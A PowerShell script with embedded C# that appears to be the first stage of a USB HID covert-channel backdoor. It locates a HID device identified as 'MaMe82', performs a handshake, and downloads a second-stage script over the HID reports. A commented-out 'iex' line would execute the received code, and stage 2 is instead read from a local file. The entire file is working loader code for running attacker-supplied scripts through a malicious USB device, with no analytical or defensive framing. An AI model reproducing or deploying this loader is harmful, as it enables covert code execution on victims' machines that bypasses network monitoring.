##############################
# Build methods to create filestream to HID device (stage 1 work)
#################################################################

$cs =@"
using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
//using System.ComponentModel;
using System.Runtime.InteropServices;



using Microsoft.Win32.SafeHandles;

//using System.Runtime;


namespace mame
{
    public class HID40
    {
        /* invalid handle value */
        public static IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);

        // kernel32.dll
        public const uint GENERIC_READ = 0x80000000;
        public const uint GENERIC_WRITE = 0x40000000;
        public const uint FILE_SHARE_WRITE = 0x2;
        public const uint FILE_SHARE_READ = 0x1;
        public const uint FILE_FLAG_OVERLAPPED = 0x40000000;
        public const uint OPEN_EXISTING = 3;
        public const uint OPEN_ALWAYS = 4;
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateFile([MarshalAs(UnmanagedType.LPStr)] string strName, uint nAccess, uint nShareMode, IntPtr lpSecurity, uint nCreationFlags, uint nAttributes, IntPtr lpTemplate);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("hid.dll", SetLastError = true)]
        public static extern void HidD_GetHidGuid(out Guid gHid);

        [DllImport("hid.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern Boolean HidD_GetManufacturerString(IntPtr hFile, StringBuilder buffer, Int32 bufferLength);

        [DllImport("hid.dll", CharSet = CharSet.Auto, SetLastError = true)]
        internal static extern bool HidD_GetSerialNumberString(IntPtr hDevice, StringBuilder buffer, Int32 bufferLength);
        
        [DllImport("hid.dll", SetLastError = true)]
        protected static extern bool HidD_GetPreparsedData(IntPtr hFile, out IntPtr lpData);

        [DllImport("hid.dll", SetLastError = true)]
        protected static extern int HidP_GetCaps(IntPtr lpData, out HidCaps oCaps);

        [DllImport("hid.dll", SetLastError = true)]
        protected static extern bool HidD_FreePreparsedData(ref IntPtr pData);

        // setupapi.dll

        public const int DIGCF_PRESENT = 0x02;
        public const int DIGCF_DEVICEINTERFACE = 0x10;

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct DeviceInterfaceData
        {
            public int Size;
            public Guid InterfaceClassGuid;
            public int Flags;
            public IntPtr Reserved;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct DeviceInterfaceDetailData
        {
            public int Size;
            
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 512)]
            public string DevicePath;
        }
        
        //We need to create a _HID_CAPS structure to retrieve HID report information
        //Details: https://msdn.microsoft.com/en-us/library/windows/hardware/ff539697(v=vs.85).aspx
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        protected struct HidCaps
        {
            public short Usage;
            public short UsagePage;
            public short InputReportByteLength;
            public short OutputReportByteLength;
            public short FeatureReportByteLength;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 0x11)]
            public short[] Reserved;
            public short NumberLinkCollectionNodes;
            public short NumberInputButtonCaps;
            public short NumberInputValueCaps;
            public short NumberInputDataIndices;
            public short NumberOutputButtonCaps;
            public short NumberOutputValueCaps;
            public short NumberOutputDataIndices;
            public short NumberFeatureButtonCaps;
            public short NumberFeatureValueCaps;
            public short NumberFeatureDataIndices;
        }
        

        [DllImport("setupapi.dll", SetLastError = true)]
        public static extern IntPtr SetupDiGetClassDevs(ref Guid gClass, [MarshalAs(UnmanagedType.LPStr)] string strEnumerator, IntPtr hParent, uint nFlags);

        [DllImport("setupapi.dll", SetLastError = true)]
        public static extern bool SetupDiEnumDeviceInterfaces(IntPtr lpDeviceInfoSet, uint nDeviceInfoData, ref Guid gClass, uint nIndex, ref DeviceInterfaceData oInterfaceData);

        [DllImport("setupapi.dll", SetLastError = true)]
        public static extern bool SetupDiGetDeviceInterfaceDetail(IntPtr lpDeviceInfoSet, ref DeviceInterfaceData oInterfaceData, ref DeviceInterfaceDetailData oDetailData, uint nDeviceInterfaceDetailDataSize, ref uint nRequiredSize, IntPtr lpDeviceInfoData);

        [DllImport("setupapi.dll", SetLastError = true)]
        public static extern bool SetupDiDestroyDeviceInfoList(IntPtr lpInfoSet);

        //public static FileStream Open(string tSerial, string tMan)
        public static FileStream Open(string tSerial, string tMan)
        {
            FileStream devFile = null;
            
            Guid gHid;
            HidD_GetHidGuid(out gHid);
            
            // create list of HID devices present right now
            var hInfoSet = SetupDiGetClassDevs(ref gHid, null, IntPtr.Zero, DIGCF_DEVICEINTERFACE | DIGCF_PRESENT);
            
            var iface = new DeviceInterfaceData(); // allocate mem for interface descriptor
            iface.Size = Marshal.SizeOf(iface); // set size field
            uint index = 0; // interface index 

            // Enumerate all interfaces with HID GUID
            while (SetupDiEnumDeviceInterfaces(hInfoSet, 0, ref gHid, index, ref iface)) 
            {
                var detIface = new DeviceInterfaceDetailData(); // detailed interface information
                uint reqSize = (uint)Marshal.SizeOf(detIface); // required size
                detIface.Size = Marshal.SizeOf(typeof(IntPtr)) == 8 ? 8 : 5; // Size depends on arch (32 / 64 bit), distinguish by IntPtr size
                
                // get device path
                SetupDiGetDeviceInterfaceDetail(hInfoSet, ref iface, ref detIface, reqSize, ref reqSize, IntPtr.Zero);
                var path = detIface.DevicePath;
                
                System.Console.WriteLine("Path: {0}", path);
            
                // Open filehandle to device
                
                var handle = CreateFile(path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, IntPtr.Zero);
                
                                
                if (handle == INVALID_HANDLE_VALUE) 
                { 
                    System.Console.WriteLine("Invalid handle");
                    index++;
                    continue;
                }
                
                IntPtr lpData;
                if (HidD_GetPreparsedData(handle, out lpData))
                {
                    HidCaps oCaps;
                    HidP_GetCaps(lpData, out oCaps);    // extract the device capabilities from the internal buffer
                    int inp = oCaps.InputReportByteLength;    // get the input...
                    int outp = oCaps.OutputReportByteLength;    // ... and output report length
                    HidD_FreePreparsedData(ref lpData);
                    System.Console.WriteLine("Input: {0}, Output: {1}",inp, outp);
                
                    // we have report length matching our input / output report, so we create a device file in each case
                    if (inp == 65 || outp == 65)
                    {
                        // check if manufacturer and serial string are matching
                    
                        //Manufacturer
                        var s = new StringBuilder(256); // returned string
                        string man = String.Empty; // get string
                        if (HidD_GetManufacturerString(handle, s, s.Capacity)) man = s.ToString();
                
                        //Serial
                        string serial = String.Empty; // get string
                        if (HidD_GetSerialNumberString(handle, s, s.Capacity)) serial = s.ToString();
                                
                        if (tMan.Equals(man, StringComparison.Ordinal) && tSerial.Equals(serial, StringComparison.Ordinal))
                        {
                            //Console.WriteLine("Device found: " + path);
                    
                            var shandle = new SafeFileHandle(handle, false);
                            
                            devFile = new FileStream(shandle, FileAccess.Read | FileAccess.Write, 32, true);
                                                        
                            
                            break;
                        }        
                        
                        
                    }
                
                }
            
                
                               
                

                index++;
            }
            SetupDiDestroyDeviceInfoList(hInfoSet);
            return devFile;
        }
    }
}
"@
Add-Type -TypeDefinition $cs  -Language CsharpVersion3


function RequestStage2 ($HIDin, $HIDout) {

    $connect_req = New-Object Byte[] (65)
    $response = New-Object Byte[] (65)
    $connect_req[2] = $connect_req[2] -bor 128 # set CONNECT BIT

    
[Console]::WriteLine("Stage1: Starting connection synchronization..")
   
    $connected = $false
    while (-not $connected)
    {
        # send packet with ACK, this should be used by the peer to chooese starting SEQ
        # the CONNECT BIT tells the peer to flush its outbound queue
        # this did ONLY happen, if we receive a report with CONNECT BIT SET (holding the initial sequence number)
        $HIDout.Write($connect_req, 0, 65) # This repoert holds has ACK=0 which should be ignored by the server
[Console]::WriteLine("Stage1: Connect request sent")

        $cr = $HIDin.Read($response, 0, 65)
        $SEQ = $response[2] -band 63
        $CONNECT_BIT = $response[2] -band 128
        
        # we repeat the alternating read write from above, until the pee recognized our connect bit
        # which means we receive the first valid SEQ in the inbound report with CONNECT BIT set

        if ($CONNECT_BIT)
        {
            [Console]::WriteLine("Satge1: Synced to SEQ number {0}" -f $SEQ)
            # this is the initial SEQ number, send corresponding ACK and exit loop
            $connect_req[2] = $connect_req[2] -bor $SEQ # set ACK to SEQ
            $HIDout.Write($connect_req, 0, 65)
            break
        }
        else
        {
            [Console]::WriteLine("SEQ {0} received on connection request, but no connect response" -f $SEQ)
        }

    }

    ######
    # we are in sync now and continue with STOP-AND-WAIT (alternating read write) the first report we write out is
    # a request for stage two which is represented by a payload with an int32=1
    #####
    $cr = $HIDin.Read($response, 0, 65)
    $SEQ = $response[2] -band 63
    $ACK = $SEQ
    
    
    # construct report (REPORT ID 0, LEN=62, FIN=true, payload[]=62*0x00)
    #$STREAM_TYPE_STAGE2_REQUEST = [int] 1
    $STREAM_TYPE_STAGE2_REQUEST = [byte] 1 + (1 -shl 4) # CHANNEL_TYPE_CONTROL, SUBTYPE_CLIENT_STAGE2_REQUEST
    $payload = [BitConverter]::GetBytes($STREAM_TYPE_STAGE2_REQUEST)
    $LEN = $payload.Length
    $FIN_BIT = (1 -shl 7) # set FIN BIT
    
    $stage2request = [Byte[]](0, ($LEN -bor $FIN_BIT), $ACK) + $payload + (New-Object byte[] (62 - $LEN))
    $HIDout.Write($stage2request, 0, 65)

    # the pee should be aware of our stage1 request, we continue with STOP-AND-WAIT till we receive the first stage1
    # report. Reassembling has to be done manually, as we don't have full duplex LinkLayer running. (In theory we would have to account
    # for lost packets and request resends in case this happens. Anyway, we rely on the peer to never send to many packets, so we should never
    # miss something).

    
    
    $stage2 = $null
    $STREAM_TYPE_STAGE2_RESPONSE = [byte] 1 + (1 -shl 4) # CHANNEL_TYPE_CONTROL, SUBTYPE_SERVER_STAGE2_RESPONSE
    while ($true)
    {
        $cr = $HIDin.Read($response, 0, 65)
        $SEQ = $response[2] -band 63 # should be former SEQ+1, but we don't handle error case
        $LEN = $response[1] -band 63
        
        

#[Console]::WriteLine("Stage1: Received SEQ {0}, LAST_SEQ {1}" -f ($SEQ, $LAST_SEQ))

        # check if response contains data
        if ($LEN -gt 0)
        {
#[Console]::WriteLine("Stage1: $response")
            $stream_type = $response[3] # contains channel_type + channel_subtype
            $host.UI.WriteLine("Stage 1: StreamType {0}" -f $stream_type)
            # check the first report of stage 2 still unreceived
            if ($stage2 -eq $null)
            {
                # check if stage 2 response stream type
                
                if ($stream_type -eq $STREAM_TYPE_STAGE2_RESPONSE)
                {
                    $stage2 = $response[4..(2+$LEN)] # omit header bytes (0 = ID, 1 = LEN/FIN, 2 = SEQ, 3 = CHANNEL TYPE / SUBTYPE)           
                }
                else
                {
                    $host.UI.WriteLine("Error on receiving stage 2, wrong type in first report. Skipping this stream...")
                }
            }
            else
            {
                # not first report, append data
                $stage2 += $response[3..(2+$LEN)] # CHANNEL TYPE not contained in ongoing stream
            }

            # end stage 2 reassembling if FIN bit is set
            $FIN_BIT = $response[1] -band 128
            if ($FIN_BIT -and $stage2 -ne $null) { break }
        }

        # send empty response with valid ACK forst last SEQ received (stop-and-wait)
        $request = New-Object Byte[] 65
        $ACK = $SEQ
        $request[2] = $ACK
        $HIDout.Write($request, 0, 65)
    }

    # if we got here, we have stage 2 represented as byte array...needs to be converted to UTF8
    $stage2 = [Text.Encoding]::UTF8.GetString($stage2)

    return $stage2
}

#########################
# Request stage 2
#########################
$devfile = [mame.HID40]::Open("deadbeefdeadbeef", "MaMe82")
$HIDin = $devfile
$HIDout = $devfile


$stage2 = RequestStage2 $HIDin $HIDout 1 # synchronize connection

"$stage2"

$stage2 = Get-Content fullduplex_stage2.ps1 | Out-String # we load stage 2 from disk

#iex $stage2
